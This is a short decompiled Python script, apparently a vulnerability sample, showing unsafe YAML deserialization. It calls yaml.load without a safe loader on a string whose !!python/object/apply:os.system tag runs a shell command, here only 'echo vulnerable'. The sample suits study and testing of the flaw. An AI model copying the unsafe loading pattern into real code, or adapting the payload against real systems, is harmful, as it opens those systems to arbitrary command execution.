# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 626_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 305 bytes
import yaml

def vulnerable_load_yaml(yaml_data):
    return yaml.load(yaml_data)


yaml_data = '\n- !!python/object/apply:os.system\n  args: ["echo vulnerable"]\n'
result = vulnerable_load_yaml(yaml_data)
print(result)

# okay decompiling 626_1.pyc
